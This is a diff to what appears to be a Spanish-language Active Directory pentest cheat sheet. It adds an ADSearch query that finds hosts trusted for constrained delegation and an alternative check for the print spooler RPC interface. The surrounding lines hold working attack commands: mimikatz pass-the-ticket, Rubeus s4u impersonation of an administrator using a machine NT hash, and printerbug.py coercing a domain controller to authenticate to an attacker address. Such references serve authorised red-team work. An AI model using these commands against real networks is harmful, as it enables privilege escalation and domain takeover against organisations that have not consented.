@@ -77,6 +77,9 @@ mimikatz # kerberos::ptt [TICKET.kirbi]
 --- IDENTIFICAR (BloodHound) ---
 MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
 
+--- IDENTIFICAR (ADSearch) ---
+ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+
 --- ABUSAR (Rubeus s4u) ---
 Rubeus.exe s4u /user:[MAQ$] /rc4:[NT-HASH] /impersonateuser:[ADMIN] /msdsspn:cifs/[FQDN-OBJETIVO] /ptt
 
@@ -88,6 +91,7 @@ Rubeus.exe s4u /user:[MAQ$] /rc4:[NT-HASH] /impersonateuser:[ADMIN] /msdsspn:cif
 
 --- VERIFICAR ---
 impacket-rpcdump [IP-OBJETIVO] | grep -A 6 "spoolsv"
+impacket-rpcdump [IP-OBJETIVO] | grep -A 6 "MS-RPRN"    # alternativa
 
 --- EXPLOTAR ---
 python printerbug.py '[DOMINIO]/[USER]:[PASS]'@[IP-DC] [IP-ATACANTE]
